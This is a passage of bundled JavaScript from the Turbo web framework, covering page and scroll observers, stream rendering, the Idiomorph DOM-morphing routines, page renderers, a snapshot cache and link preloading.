    initial: 0,
    loading: 1,
    interactive: 2,
    complete: 3
  };
  var PageObserver = class {
    stage = PageStage.initial;
    started = false;
    constructor(delegate) {
      this.delegate = delegate;
    }
    start() {
      if (!this.started) {
        if (this.stage == PageStage.initial) {
          this.stage = PageStage.loading;
        }
        document.addEventListener("readystatechange", this.interpretReadyState, false);
        addEventListener("pagehide", this.pageWillUnload, false);
        this.started = true;
      }
    }
    stop() {
      if (this.started) {
        document.removeEventListener("readystatechange", this.interpretReadyState, false);
        removeEventListener("pagehide", this.pageWillUnload, false);
        this.started = false;
      }
    }
    interpretReadyState = () => {
      const { readyState } = this;
      if (readyState == "interactive") {
        this.pageIsInteractive();
      } else if (readyState == "complete") {
        this.pageIsComplete();
      }
    };
    pageIsInteractive() {
      if (this.stage == PageStage.loading) {
        this.stage = PageStage.interactive;
        this.delegate.pageBecameInteractive();
      }
    }
    pageIsComplete() {
      this.pageIsInteractive();
      if (this.stage == PageStage.interactive) {
        this.stage = PageStage.complete;
        this.delegate.pageLoaded();
      }
    }
    pageWillUnload = () => {
      this.delegate.pageWillUnload();
    };
    get readyState() {
      return document.readyState;
    }
  };
  var ScrollObserver = class {
    started = false;
    constructor(delegate) {
      this.delegate = delegate;
    }
    start() {
      if (!this.started) {
        addEventListener("scroll", this.onScroll, false);
        this.onScroll();
        this.started = true;
      }
    }
    stop() {
      if (this.started) {
        removeEventListener("scroll", this.onScroll, false);
        this.started = false;
      }
    }
    onScroll = () => {
      this.updatePosition({ x: window.pageXOffset, y: window.pageYOffset });
    };
    // Private
    updatePosition(position) {
      this.delegate.scrollPositionChanged(position);
    }
  };
  var StreamMessageRenderer = class {
    render({ fragment }) {
      Bardo.preservingPermanentElements(this, getPermanentElementMapForFragment(fragment), () => {
        withAutofocusFromFragment(fragment, () => {
          withPreservedFocus(() => {
            document.documentElement.appendChild(fragment);
          });
        });
      });
    }
    // Bardo delegate
    enteringBardo(currentPermanentElement, newPermanentElement) {
      newPermanentElement.replaceWith(currentPermanentElement.cloneNode(true));
    }
    leavingBardo() {
    }
  };
  function getPermanentElementMapForFragment(fragment) {
    const permanentElementsInDocument = queryPermanentElementsAll(document.documentElement);
    const permanentElementMap = {};
    for (const permanentElementInDocument of permanentElementsInDocument) {
      const { id } = permanentElementInDocument;
      for (const streamElement of fragment.querySelectorAll("turbo-stream")) {
        const elementInStream = getPermanentElementById(streamElement.templateElement.content, id);
        if (elementInStream) {
          permanentElementMap[id] = [permanentElementInDocument, elementInStream];
        }
      }
    }
    return permanentElementMap;
  }
  async function withAutofocusFromFragment(fragment, callback) {
    const generatedID = `turbo-stream-autofocus-${uuid()}`;
    const turboStreams = fragment.querySelectorAll("turbo-stream");
    const elementWithAutofocus = firstAutofocusableElementInStreams(turboStreams);
    let willAutofocusId = null;
    if (elementWithAutofocus) {
      if (elementWithAutofocus.id) {
        willAutofocusId = elementWithAutofocus.id;
      } else {
        willAutofocusId = generatedID;
      }
      elementWithAutofocus.id = willAutofocusId;
    }
    callback();
    await nextRepaint();
    const hasNoActiveElement = document.activeElement == null || document.activeElement == document.body;
    if (hasNoActiveElement && willAutofocusId) {
      const elementToAutofocus = document.getElementById(willAutofocusId);
      if (elementIsFocusable(elementToAutofocus)) {
        elementToAutofocus.focus();
      }
      if (elementToAutofocus && elementToAutofocus.id == generatedID) {
        elementToAutofocus.removeAttribute("id");
      }
    }
  }
  async function withPreservedFocus(callback) {
    const [activeElementBeforeRender, activeElementAfterRender] = await around(callback, () => document.activeElement);
    const restoreFocusTo = activeElementBeforeRender && activeElementBeforeRender.id;
    if (restoreFocusTo) {
      const elementToFocus = document.getElementById(restoreFocusTo);
      if (elementIsFocusable(elementToFocus) && elementToFocus != activeElementAfterRender) {
        elementToFocus.focus();
      }
    }
  }
  function firstAutofocusableElementInStreams(nodeListOfStreamElements) {
    for (const streamElement of nodeListOfStreamElements) {
      const elementWithAutofocus = queryAutofocusableElement(streamElement.templateElement.content);
      if (elementWithAutofocus)
        return elementWithAutofocus;
    }
    return null;
  }
  var StreamObserver = class {
    sources = /* @__PURE__ */ new Set();
    #started = false;
    constructor(delegate) {
      this.delegate = delegate;
    }
    start() {
      if (!this.#started) {
        this.#started = true;
        addEventListener("turbo:before-fetch-response", this.inspectFetchResponse, false);
      }
    }
    stop() {
      if (this.#started) {
        this.#started = false;
        removeEventListener("turbo:before-fetch-response", this.inspectFetchResponse, false);
      }
    }
    connectStreamSource(source) {
      if (!this.streamSourceIsConnected(source)) {
        this.sources.add(source);
        source.addEventListener("message", this.receiveMessageEvent, false);
      }
    }
    disconnectStreamSource(source) {
      if (this.streamSourceIsConnected(source)) {
        this.sources.delete(source);
        source.removeEventListener("message", this.receiveMessageEvent, false);
      }
    }
    streamSourceIsConnected(source) {
      return this.sources.has(source);
    }
    inspectFetchResponse = (event) => {
      const response = fetchResponseFromEvent(event);
      if (response && fetchResponseIsStream(response)) {
        event.preventDefault();
        this.receiveMessageResponse(response);
      }
    };
    receiveMessageEvent = (event) => {
      if (this.#started && typeof event.data == "string") {
        this.receiveMessageHTML(event.data);
      }
    };
    async receiveMessageResponse(response) {
      const html = await response.responseHTML;
      if (html) {
        this.receiveMessageHTML(html);
      }
    }
    receiveMessageHTML(html) {
      this.delegate.receivedMessageFromStream(StreamMessage.wrap(html));
    }
  };
  function fetchResponseFromEvent(event) {
    const fetchResponse = event.detail?.fetchResponse;
    if (fetchResponse instanceof FetchResponse) {
      return fetchResponse;
    }
  }
  function fetchResponseIsStream(response) {
    const contentType = response.contentType ?? "";
    return contentType.startsWith(StreamMessage.contentType);
  }
  var ErrorRenderer = class extends Renderer {
    static renderElement(currentElement, newElement) {
      const { documentElement, body } = document;
      documentElement.replaceChild(newElement, body);
    }
    async render() {
      this.replaceHeadAndBody();
      this.activateScriptElements();
    }
    replaceHeadAndBody() {
      const { documentElement, head } = document;
      documentElement.replaceChild(this.newHead, head);
      this.renderElement(this.currentElement, this.newElement);
    }
    activateScriptElements() {
      for (const replaceableElement of this.scriptElements) {
        const parentNode = replaceableElement.parentNode;
        if (parentNode) {
          const element = activateScriptElement(replaceableElement);
          parentNode.replaceChild(element, replaceableElement);
        }
      }
    }
    get newHead() {
      return this.newSnapshot.headSnapshot.element;
    }
    get scriptElements() {
      return document.documentElement.querySelectorAll("script");
    }
  };
  var EMPTY_SET = /* @__PURE__ */ new Set();
  function morph(oldNode, newContent, config = {}) {
    if (oldNode instanceof Document) {
      oldNode = oldNode.documentElement;
    }
    if (typeof newContent === "string") {
      newContent = parseContent(newContent);
    }
    let normalizedContent = normalizeContent(newContent);
    let ctx = createMorphContext(oldNode, normalizedContent, config);
    return morphNormalizedContent(oldNode, normalizedContent, ctx);
  }
  function morphNormalizedContent(oldNode, normalizedNewContent, ctx) {
    if (ctx.head.block) {
      let oldHead = oldNode.querySelector("head");
      let newHead = normalizedNewContent.querySelector("head");
      if (oldHead && newHead) {
        let promises = handleHeadElement(newHead, oldHead, ctx);
        Promise.all(promises).then(function() {
          morphNormalizedContent(oldNode, normalizedNewContent, Object.assign(ctx, {
            head: {
              block: false,
              ignore: true
            }
          }));
        });
        return;
      }
    }
    if (ctx.morphStyle === "innerHTML") {
      morphChildren(normalizedNewContent, oldNode, ctx);
      return oldNode.children;
    } else if (ctx.morphStyle === "outerHTML" || ctx.morphStyle == null) {
      let bestMatch = findBestNodeMatch(normalizedNewContent, oldNode, ctx);
      let previousSibling = bestMatch?.previousSibling;
      let nextSibling = bestMatch?.nextSibling;
      let morphedNode = morphOldNodeTo(oldNode, bestMatch, ctx);
      if (bestMatch) {
        return insertSiblings(previousSibling, morphedNode, nextSibling);
      } else {
        return [];
      }
    } else {
      throw "Do not understand how to morph style " + ctx.morphStyle;
    }
  }
  function morphOldNodeTo(oldNode, newContent, ctx) {
    if (ctx.ignoreActive && oldNode === document.activeElement)
      ;
    else if (newContent == null) {
      if (ctx.callbacks.beforeNodeRemoved(oldNode) === false)
        return;
      oldNode.remove();
      ctx.callbacks.afterNodeRemoved(oldNode);
      return null;
    } else if (!isSoftMatch(oldNode, newContent)) {
      if (ctx.callbacks.beforeNodeRemoved(oldNode) === false)
        return;
      if (ctx.callbacks.beforeNodeAdded(newContent) === false)
        return;
      oldNode.parentElement.replaceChild(newContent, oldNode);
      ctx.callbacks.afterNodeAdded(newContent);
      ctx.callbacks.afterNodeRemoved(oldNode);
      return newContent;
    } else {
      if (ctx.callbacks.beforeNodeMorphed(oldNode, newContent) === false)
        return;
      if (oldNode instanceof HTMLHeadElement && ctx.head.ignore)
        ;
      else if (oldNode instanceof HTMLHeadElement && ctx.head.style !== "morph") {
        handleHeadElement(newContent, oldNode, ctx);
      } else {
        syncNodeFrom(newContent, oldNode);
        morphChildren(newContent, oldNode, ctx);
      }
      ctx.callbacks.afterNodeMorphed(oldNode, newContent);
      return oldNode;
    }
  }
  function morphChildren(newParent, oldParent, ctx) {
    let nextNewChild = newParent.firstChild;
    let insertionPoint = oldParent.firstChild;
    let newChild;
    while (nextNewChild) {
      newChild = nextNewChild;
      nextNewChild = newChild.nextSibling;
      if (insertionPoint == null) {
        if (ctx.callbacks.beforeNodeAdded(newChild) === false)
          return;
        oldParent.appendChild(newChild);
        ctx.callbacks.afterNodeAdded(newChild);
        removeIdsFromConsideration(ctx, newChild);
        continue;
      }
      if (isIdSetMatch(newChild, insertionPoint, ctx)) {
        morphOldNodeTo(insertionPoint, newChild, ctx);
        insertionPoint = insertionPoint.nextSibling;
        removeIdsFromConsideration(ctx, newChild);
        continue;
      }
      let idSetMatch = findIdSetMatch(newParent, oldParent, newChild, insertionPoint, ctx);
      if (idSetMatch) {
        insertionPoint = removeNodesBetween(insertionPoint, idSetMatch, ctx);
        morphOldNodeTo(idSetMatch, newChild, ctx);
        removeIdsFromConsideration(ctx, newChild);
        continue;
      }
      let softMatch = findSoftMatch(newParent, oldParent, newChild, insertionPoint, ctx);
      if (softMatch) {
        insertionPoint = removeNodesBetween(insertionPoint, softMatch, ctx);
        morphOldNodeTo(softMatch, newChild, ctx);
        removeIdsFromConsideration(ctx, newChild);
        continue;
      }
      if (ctx.callbacks.beforeNodeAdded(newChild) === false)
        return;
      oldParent.insertBefore(newChild, insertionPoint);
      ctx.callbacks.afterNodeAdded(newChild);
      removeIdsFromConsideration(ctx, newChild);
    }
    while (insertionPoint !== null) {
      let tempNode = insertionPoint;
      insertionPoint = insertionPoint.nextSibling;
      removeNode(tempNode, ctx);
    }
  }
  function syncNodeFrom(from, to) {
    let type = from.nodeType;
    if (type === 1) {
      const fromAttributes = from.attributes;
      const toAttributes = to.attributes;
      for (const fromAttribute of fromAttributes) {
        if (to.getAttribute(fromAttribute.name) !== fromAttribute.value) {
          to.setAttribute(fromAttribute.name, fromAttribute.value);
        }
      }
      for (const toAttribute of toAttributes) {
        if (!from.hasAttribute(toAttribute.name)) {
          to.removeAttribute(toAttribute.name);
        }
      }
    }
    if (type === 8 || type === 3) {
      if (to.nodeValue !== from.nodeValue) {
        to.nodeValue = from.nodeValue;
      }
    }
    if (from instanceof HTMLInputElement && to instanceof HTMLInputElement && from.type !== "file") {
      to.value = from.value || "";
      syncAttribute(from, to, "value");
      syncAttribute(from, to, "checked");
      syncAttribute(from, to, "disabled");
    } else if (from instanceof HTMLOptionElement) {
      syncAttribute(from, to, "selected");
    } else if (from instanceof HTMLTextAreaElement && to instanceof HTMLTextAreaElement) {
      let fromValue = from.value;
      let toValue = to.value;
      if (fromValue !== toValue) {
        to.value = fromValue;
      }
      if (to.firstChild && to.firstChild.nodeValue !== fromValue) {
        to.firstChild.nodeValue = fromValue;
      }
    }
  }
  function syncAttribute(from, to, attributeName) {
    if (from[attributeName] !== to[attributeName]) {
      if (from[attributeName]) {
        to.setAttribute(attributeName, from[attributeName]);
      } else {
        to.removeAttribute(attributeName);
      }
    }
  }
  function handleHeadElement(newHeadTag, currentHead, ctx) {
    let added = [];
    let removed = [];
    let preserved = [];
    let nodesToAppend = [];
    let headMergeStyle = ctx.head.style;
    let srcToNewHeadNodes = /* @__PURE__ */ new Map();
    for (const newHeadChild of newHeadTag.children) {
      srcToNewHeadNodes.set(newHeadChild.outerHTML, newHeadChild);
    }
    for (const currentHeadElt of currentHead.children) {
      let inNewContent = srcToNewHeadNodes.has(currentHeadElt.outerHTML);
      let isReAppended = ctx.head.shouldReAppend(currentHeadElt);
      let isPreserved = ctx.head.shouldPreserve(currentHeadElt);
      if (inNewContent || isPreserved) {
        if (isReAppended) {
          removed.push(currentHeadElt);
        } else {
          srcToNewHeadNodes.delete(currentHeadElt.outerHTML);
          preserved.push(currentHeadElt);
        }
      } else {
        if (headMergeStyle === "append") {
          if (isReAppended) {
            removed.push(currentHeadElt);
            nodesToAppend.push(currentHeadElt);
          }
        } else {
          if (ctx.head.shouldRemove(currentHeadElt) !== false) {
            removed.push(currentHeadElt);
          }
        }
      }
    }
    nodesToAppend.push(...srcToNewHeadNodes.values());
    let promises = [];
    for (const newNode of nodesToAppend) {
      let newElt = document.createRange().createContextualFragment(newNode.outerHTML).firstChild;
      if (ctx.callbacks.beforeNodeAdded(newElt) !== false) {
        if (newElt.href || newElt.src) {
          let resolve = null;
          let promise = new Promise(function(_resolve) {
            resolve = _resolve;
          });
          newElt.addEventListener("load", function() {
            resolve();
          });
          promises.push(promise);
        }
        currentHead.appendChild(newElt);
        ctx.callbacks.afterNodeAdded(newElt);
        added.push(newElt);
      }
    }
    for (const removedElement of removed) {
      if (ctx.callbacks.beforeNodeRemoved(removedElement) !== false) {
        currentHead.removeChild(removedElement);
        ctx.callbacks.afterNodeRemoved(removedElement);
      }
    }
    ctx.head.afterHeadMorphed(currentHead, { added, kept: preserved, removed });
    return promises;
  }
  function noOp() {
  }
  function createMorphContext(oldNode, newContent, config) {
    return {
      target: oldNode,
      newContent,
      config,
      morphStyle: config.morphStyle,
      ignoreActive: config.ignoreActive,
      idMap: createIdMap(oldNode, newContent),
      deadIds: /* @__PURE__ */ new Set(),
      callbacks: Object.assign({
        beforeNodeAdded: noOp,
        afterNodeAdded: noOp,
        beforeNodeMorphed: noOp,
        afterNodeMorphed: noOp,
        beforeNodeRemoved: noOp,
        afterNodeRemoved: noOp
      }, config.callbacks),
      head: Object.assign({
        style: "merge",
        shouldPreserve: function(elt) {
          return elt.getAttribute("im-preserve") === "true";
        },
        shouldReAppend: function(elt) {
          return elt.getAttribute("im-re-append") === "true";
        },
        shouldRemove: noOp,
        afterHeadMorphed: noOp
      }, config.head)
    };
  }
  function isIdSetMatch(node1, node2, ctx) {
    if (node1 == null || node2 == null) {
      return false;
    }
    if (node1.nodeType === node2.nodeType && node1.tagName === node2.tagName) {
      if (node1.id !== "" && node1.id === node2.id) {
        return true;
      } else {
        return getIdIntersectionCount(ctx, node1, node2) > 0;
      }
    }
    return false;
  }
  function isSoftMatch(node1, node2) {
    if (node1 == null || node2 == null) {
      return false;
    }
    return node1.nodeType === node2.nodeType && node1.tagName === node2.tagName;
  }
  function removeNodesBetween(startInclusive, endExclusive, ctx) {
    while (startInclusive !== endExclusive) {
      let tempNode = startInclusive;
      startInclusive = startInclusive.nextSibling;
      removeNode(tempNode, ctx);
    }
    removeIdsFromConsideration(ctx, endExclusive);
    return endExclusive.nextSibling;
  }
  function findIdSetMatch(newContent, oldParent, newChild, insertionPoint, ctx) {
    let newChildPotentialIdCount = getIdIntersectionCount(ctx, newChild, oldParent);
    let potentialMatch = null;
    if (newChildPotentialIdCount > 0) {
      let potentialMatch2 = insertionPoint;
      let otherMatchCount = 0;
      while (potentialMatch2 != null) {
        if (isIdSetMatch(newChild, potentialMatch2, ctx)) {
          return potentialMatch2;
        }
        otherMatchCount += getIdIntersectionCount(ctx, potentialMatch2, newContent);
        if (otherMatchCount > newChildPotentialIdCount) {
          return null;
        }
        potentialMatch2 = potentialMatch2.nextSibling;
      }
    }
    return potentialMatch;
  }
  function findSoftMatch(newContent, oldParent, newChild, insertionPoint, ctx) {
    let potentialSoftMatch = insertionPoint;
    let nextSibling = newChild.nextSibling;
    let siblingSoftMatchCount = 0;
    while (potentialSoftMatch != null) {
      if (getIdIntersectionCount(ctx, potentialSoftMatch, newContent) > 0) {
        return null;
      }
      if (isSoftMatch(newChild, potentialSoftMatch)) {
        return potentialSoftMatch;
      }
      if (isSoftMatch(nextSibling, potentialSoftMatch)) {
        siblingSoftMatchCount++;
        nextSibling = nextSibling.nextSibling;
        if (siblingSoftMatchCount >= 2) {
          return null;
        }
      }
      potentialSoftMatch = potentialSoftMatch.nextSibling;
    }
    return potentialSoftMatch;
  }
  function parseContent(newContent) {
    let parser = new DOMParser();
    let contentWithSvgsRemoved = newContent.replace(/<svg(\s[^>]*>|>)([\s\S]*?)<\/svg>/gim, "");
    if (contentWithSvgsRemoved.match(/<\/html>/) || contentWithSvgsRemoved.match(/<\/head>/) || contentWithSvgsRemoved.match(/<\/body>/)) {
      let content = parser.parseFromString(newContent, "text/html");
      if (contentWithSvgsRemoved.match(/<\/html>/)) {
        content.generatedByIdiomorph = true;
        return content;
      } else {
        let htmlElement = content.firstChild;
        if (htmlElement) {
          htmlElement.generatedByIdiomorph = true;
          return htmlElement;
        } else {
          return null;
        }
      }
    } else {
      let responseDoc = parser.parseFromString("<body><template>" + newContent + "</template></body>", "text/html");
      let content = responseDoc.body.querySelector("template").content;
      content.generatedByIdiomorph = true;
      return content;
    }
  }
  function normalizeContent(newContent) {
    if (newContent == null) {
      const dummyParent = document.createElement("div");
      return dummyParent;
    } else if (newContent.generatedByIdiomorph) {
      return newContent;
    } else if (newContent instanceof Node) {
      const dummyParent = document.createElement("div");
      dummyParent.append(newContent);
      return dummyParent;
    } else {
      const dummyParent = document.createElement("div");
      for (const elt of [...newContent]) {
        dummyParent.append(elt);
      }
      return dummyParent;
    }
  }
  function insertSiblings(previousSibling, morphedNode, nextSibling) {
    let stack = [];
    let added = [];
    while (previousSibling != null) {
      stack.push(previousSibling);
      previousSibling = previousSibling.previousSibling;
    }
    while (stack.length > 0) {
      let node = stack.pop();
      added.push(node);
      morphedNode.parentElement.insertBefore(node, morphedNode);
    }
    added.push(morphedNode);
    while (nextSibling != null) {
      stack.push(nextSibling);
      added.push(nextSibling);
      nextSibling = nextSibling.nextSibling;
    }
    while (stack.length > 0) {
      morphedNode.parentElement.insertBefore(stack.pop(), morphedNode.nextSibling);
    }
    return added;
  }
  function findBestNodeMatch(newContent, oldNode, ctx) {
    let currentElement;
    currentElement = newContent.firstChild;
    let bestElement = currentElement;
    let score = 0;
    while (currentElement) {
      let newScore = scoreElement(currentElement, oldNode, ctx);
      if (newScore > score) {
        bestElement = currentElement;
        score = newScore;
      }
      currentElement = currentElement.nextSibling;
    }
    return bestElement;
  }
  function scoreElement(node1, node2, ctx) {
    if (isSoftMatch(node1, node2)) {
      return 0.5 + getIdIntersectionCount(ctx, node1, node2);
    }
    return 0;
  }
  function removeNode(tempNode, ctx) {
    removeIdsFromConsideration(ctx, tempNode);
    if (ctx.callbacks.beforeNodeRemoved(tempNode) === false)
      return;
    tempNode.remove();
    ctx.callbacks.afterNodeRemoved(tempNode);
  }
  function isIdInConsideration(ctx, id) {
    return !ctx.deadIds.has(id);
  }
  function idIsWithinNode(ctx, id, targetNode) {
    let idSet = ctx.idMap.get(targetNode) || EMPTY_SET;
    return idSet.has(id);
  }
  function removeIdsFromConsideration(ctx, node) {
    let idSet = ctx.idMap.get(node) || EMPTY_SET;
    for (const id of idSet) {
      ctx.deadIds.add(id);
    }
  }
  function getIdIntersectionCount(ctx, node1, node2) {
    let sourceSet = ctx.idMap.get(node1) || EMPTY_SET;
    let matchCount = 0;
    for (const id of sourceSet) {
      if (isIdInConsideration(ctx, id) && idIsWithinNode(ctx, id, node2)) {
        ++matchCount;
      }
    }
    return matchCount;
  }
  function populateIdMapForNode(node, idMap) {
    let nodeParent = node.parentElement;
    let idElements = node.querySelectorAll("[id]");
    for (const elt of idElements) {
      let current = elt;
      while (current !== nodeParent && current != null) {
        let idSet = idMap.get(current);
        if (idSet == null) {
          idSet = /* @__PURE__ */ new Set();
          idMap.set(current, idSet);
        }
        idSet.add(elt.id);
        current = current.parentElement;
      }
    }
  }
  function createIdMap(oldContent, newContent) {
    let idMap = /* @__PURE__ */ new Map();
    populateIdMapForNode(oldContent, idMap);
    populateIdMapForNode(newContent, idMap);
    return idMap;
  }
  var idiomorph = { morph };
  var MorphRenderer = class extends Renderer {
    async render() {
      if (this.willRender)
        await this.#morphBody();
    }
    get renderMethod() {
      return "morph";
    }
    // Private
    async #morphBody() {
      this.#morphElements(this.currentElement, this.newElement);
      this.#reloadRemoteFrames();
      dispatch("turbo:morph", {
        detail: {
          currentElement: this.currentElement,
          newElement: this.newElement
        }
      });
    }
    #morphElements(currentElement, newElement, morphStyle = "outerHTML") {
      this.isMorphingTurboFrame = this.#isFrameReloadedWithMorph(currentElement);
      idiomorph.morph(currentElement, newElement, {
        morphStyle,
        callbacks: {
          beforeNodeAdded: this.#shouldAddElement,
          beforeNodeMorphed: this.#shouldMorphElement,
          beforeNodeRemoved: this.#shouldRemoveElement
        }
      });
    }
    #shouldAddElement = (node) => {
      return !(node.id && node.hasAttribute("data-turbo-permanent") && document.getElementById(node.id));
    };
    #shouldMorphElement = (oldNode, newNode) => {
      if (oldNode instanceof HTMLElement) {
        return !oldNode.hasAttribute("data-turbo-permanent") && (this.isMorphingTurboFrame || !this.#isFrameReloadedWithMorph(oldNode));
      } else {
        return true;
      }
    };
    #shouldRemoveElement = (node) => {
      return this.#shouldMorphElement(node);
    };
    #reloadRemoteFrames() {
      this.#remoteFrames().forEach((frame) => {
        if (this.#isFrameReloadedWithMorph(frame)) {
          this.#renderFrameWithMorph(frame);
          frame.reload();
        }
      });
    }
    #renderFrameWithMorph(frame) {
      frame.addEventListener("turbo:before-frame-render", (event) => {
        event.detail.render = this.#morphFrameUpdate;
      }, { once: true });
    }
    #morphFrameUpdate = (currentElement, newElement) => {
      dispatch("turbo:before-frame-morph", {
        target: currentElement,
        detail: { currentElement, newElement }
      });
      this.#morphElements(currentElement, newElement.children, "innerHTML");
    };
    #isFrameReloadedWithMorph(element) {
      return element.src && element.refresh === "morph";
    }
    #remoteFrames() {
      return Array.from(document.querySelectorAll("turbo-frame[src]")).filter((frame) => {
        return !frame.closest("[data-turbo-permanent]");
      });
    }
  };
  var PageRenderer = class extends Renderer {
    static renderElement(currentElement, newElement) {
      if (document.body && newElement instanceof HTMLBodyElement) {
        document.body.replaceWith(newElement);
      } else {
        document.documentElement.appendChild(newElement);
      }
    }
    get shouldRender() {
      return this.newSnapshot.isVisitable && this.trackedElementsAreIdentical;
    }
    get reloadReason() {
      if (!this.newSnapshot.isVisitable) {
        return {
          reason: "turbo_visit_control_is_reload"
        };
      }
      if (!this.trackedElementsAreIdentical) {
        return {
          reason: "tracked_element_mismatch"
        };
      }
    }
    async prepareToRender() {
      this.#setLanguage();
      await this.mergeHead();
    }
    async render() {
      if (this.willRender) {
        await this.replaceBody();
      }
    }
    finishRendering() {
      super.finishRendering();
      if (!this.isPreview) {
        this.focusFirstAutofocusableElement();
      }
    }
    get currentHeadSnapshot() {
      return this.currentSnapshot.headSnapshot;
    }
    get newHeadSnapshot() {
      return this.newSnapshot.headSnapshot;
    }
    get newElement() {
      return this.newSnapshot.element;
    }
    #setLanguage() {
      const { documentElement } = this.currentSnapshot;
      const { lang } = this.newSnapshot;
      if (lang) {
        documentElement.setAttribute("lang", lang);
      } else {
        documentElement.removeAttribute("lang");
      }
    }
    async mergeHead() {
      const mergedHeadElements = this.mergeProvisionalElements();
      const newStylesheetElements = this.copyNewHeadStylesheetElements();
      this.copyNewHeadScriptElements();
      await mergedHeadElements;
      await newStylesheetElements;
    }
    async replaceBody() {
      await this.preservingPermanentElements(async () => {
        this.activateNewBody();
        await this.assignNewBody();
      });
    }
    get trackedElementsAreIdentical() {
      return this.currentHeadSnapshot.trackedElementSignature == this.newHeadSnapshot.trackedElementSignature;
    }
    async copyNewHeadStylesheetElements() {
      const loadingElements = [];
      for (const element of this.newHeadStylesheetElements) {
        loadingElements.push(waitForLoad(element));
        document.head.appendChild(element);
      }
      await Promise.all(loadingElements);
    }
    copyNewHeadScriptElements() {
      for (const element of this.newHeadScriptElements) {
        document.head.appendChild(activateScriptElement(element));
      }
    }
    async mergeProvisionalElements() {
      const newHeadElements = [...this.newHeadProvisionalElements];
      for (const element of this.currentHeadProvisionalElements) {
        if (!this.isCurrentElementInElementList(element, newHeadElements)) {
          document.head.removeChild(element);
        }
      }
      for (const element of newHeadElements) {
        document.head.appendChild(element);
      }
    }
    isCurrentElementInElementList(element, elementList) {
      for (const [index, newElement] of elementList.entries()) {
        if (element.tagName == "TITLE") {
          if (newElement.tagName != "TITLE") {
            continue;
          }
          if (element.innerHTML == newElement.innerHTML) {
            elementList.splice(index, 1);
            return true;
          }
        }
        if (newElement.isEqualNode(element)) {
          elementList.splice(index, 1);
          return true;
        }
      }
      return false;
    }
    removeCurrentHeadProvisionalElements() {
      for (const element of this.currentHeadProvisionalElements) {
        document.head.removeChild(element);
      }
    }
    copyNewHeadProvisionalElements() {
      for (const element of this.newHeadProvisionalElements) {
        document.head.appendChild(element);
      }
    }
    activateNewBody() {
      document.adoptNode(this.newElement);
      this.activateNewBodyScriptElements();
    }
    activateNewBodyScriptElements() {
      for (const inertScriptElement of this.newBodyScriptElements) {
        const activatedScriptElement = activateScriptElement(inertScriptElement);
        inertScriptElement.replaceWith(activatedScriptElement);
      }
    }
    async assignNewBody() {
      await this.renderElement(this.currentElement, this.newElement);
    }
    get newHeadStylesheetElements() {
      return this.newHeadSnapshot.getStylesheetElementsNotInSnapshot(this.currentHeadSnapshot);
    }
    get newHeadScriptElements() {
      return this.newHeadSnapshot.getScriptElementsNotInSnapshot(this.currentHeadSnapshot);
    }
    get currentHeadProvisionalElements() {
      return this.currentHeadSnapshot.provisionalElements;
    }
    get newHeadProvisionalElements() {
      return this.newHeadSnapshot.provisionalElements;
    }
    get newBodyScriptElements() {
      return this.newElement.querySelectorAll("script");
    }
  };
  var SnapshotCache = class {
    keys = [];
    snapshots = {};
    constructor(size) {
      this.size = size;
    }
    has(location2) {
      return toCacheKey(location2) in this.snapshots;
    }
    get(location2) {
      if (this.has(location2)) {
        const snapshot = this.read(location2);
        this.touch(location2);
        return snapshot;
      }
    }
    put(location2, snapshot) {
      this.write(location2, snapshot);
      this.touch(location2);
      return snapshot;
    }
    clear() {
      this.snapshots = {};
    }
    // Private
    read(location2) {
      return this.snapshots[toCacheKey(location2)];
    }
    write(location2, snapshot) {
      this.snapshots[toCacheKey(location2)] = snapshot;
    }
    touch(location2) {
      const key = toCacheKey(location2);
      const index = this.keys.indexOf(key);
      if (index > -1)
        this.keys.splice(index, 1);
      this.keys.unshift(key);
      this.trim();
    }
    trim() {
      for (const key of this.keys.splice(this.size)) {
        delete this.snapshots[key];
      }
    }
  };
  var PageView = class extends View {
    snapshotCache = new SnapshotCache(10);
    lastRenderedLocation = new URL(location.href);
    forceReloaded = false;
    shouldTransitionTo(newSnapshot) {
      return this.snapshot.prefersViewTransitions && newSnapshot.prefersViewTransitions;
    }
    renderPage(snapshot, isPreview = false, willRender = true, visit2) {
      const shouldMorphPage = this.isPageRefresh(visit2) && this.snapshot.shouldMorphPage;
      const rendererClass = shouldMorphPage ? MorphRenderer : PageRenderer;
      const renderer = new rendererClass(this.snapshot, snapshot, PageRenderer.renderElement, isPreview, willRender);
      if (!renderer.shouldRender) {
        this.forceReloaded = true;
      } else {
        visit2?.changeHistory();
      }
      return this.render(renderer);
    }
    renderError(snapshot, visit2) {
      visit2?.changeHistory();
      const renderer = new ErrorRenderer(this.snapshot, snapshot, ErrorRenderer.renderElement, false);
      return this.render(renderer);
    }
    clearSnapshotCache() {
      this.snapshotCache.clear();
    }
    async cacheSnapshot(snapshot = this.snapshot) {
      if (snapshot.isCacheable) {
        this.delegate.viewWillCacheSnapshot();
        const { lastRenderedLocation: location2 } = this;
        await nextEventLoopTick();
        const cachedSnapshot = snapshot.clone();
        this.snapshotCache.put(location2, cachedSnapshot);
        return cachedSnapshot;
      }
    }
    getCachedSnapshotForLocation(location2) {
      return this.snapshotCache.get(location2);
    }
    isPageRefresh(visit2) {
      return !visit2 || this.lastRenderedLocation.pathname === visit2.location.pathname && visit2.action === "replace";
    }
    shouldPreserveScrollPosition(visit2) {
      return this.isPageRefresh(visit2) && this.snapshot.shouldPreserveScrollPosition;
    }
    get snapshot() {
      return PageSnapshot.fromElement(this.element);
    }
  };
  var Preloader = class {
    selector = "a[data-turbo-preload]";
    constructor(delegate, snapshotCache) {
      this.delegate = delegate;
      this.snapshotCache = snapshotCache;
    }
    start() {
      if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", this.#preloadAll);
      } else {
        this.preloadOnLoadLinksForView(document.body);
      }
    }
    stop() {
      document.removeEventListener("DOMContentLoaded", this.#preloadAll);
    }
    preloadOnLoadLinksForView(element) {
      for (const link of element.querySelectorAll(this.selector)) {
        if (this.delegate.shouldPreloadLink(link)) {
          this.preloadURL(link);
        }
      }
    }
    async preloadURL(link) {
      const location2 = new URL(link.href);
      if (this.snapshotCache.has(location2)) {
        return;
      }
      const fetchRequest = new FetchRequest(this, FetchMethod.get, location2, new URLSearchParams(), link);
      await fetchRequest.perform();
    }
    // Fetch request delegate
    prepareRequest(fetchRequest) {
      fetchRequest.headers["Sec-Purpose"] = "prefetch";
    }
    async requestSucceededWithResponse(fetchRequest, fetchResponse) {
      try {
        const responseHTML = await fetchResponse.responseHTML;
        const snapshot = PageSnapshot.fromHTMLString(responseHTML);
        this.snapshotCache.put(fetchRequest.url, snapshot);
      } catch (_) {
      }
    }
    requestStarted(fetchRequest) {
    }
